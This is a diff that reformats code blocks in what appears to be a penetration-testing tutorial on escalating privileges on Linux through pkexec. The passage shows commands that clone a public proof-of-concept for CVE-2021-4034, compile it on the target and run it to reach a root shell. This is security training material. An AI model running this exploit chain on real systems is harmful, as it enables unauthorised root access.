@@ -19,8 +19,7 @@ PolKit also comes with three additional programs:
 
 The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ # pkexec -u <user> <command>
 cry0l1t3@nix02:~$ pkexec -u root id
 
@@ -31,8 +30,7 @@ In the `pkexec` tool, the memory corruption vulnerability with the identifier [C
 
 To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
 cry0l1t3@nix02:~$ cd CVE-2021-4034
 cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
@@ -40,8 +38,7 @@ cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
 
 Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@nix02:~$ ./poc
 
 # id
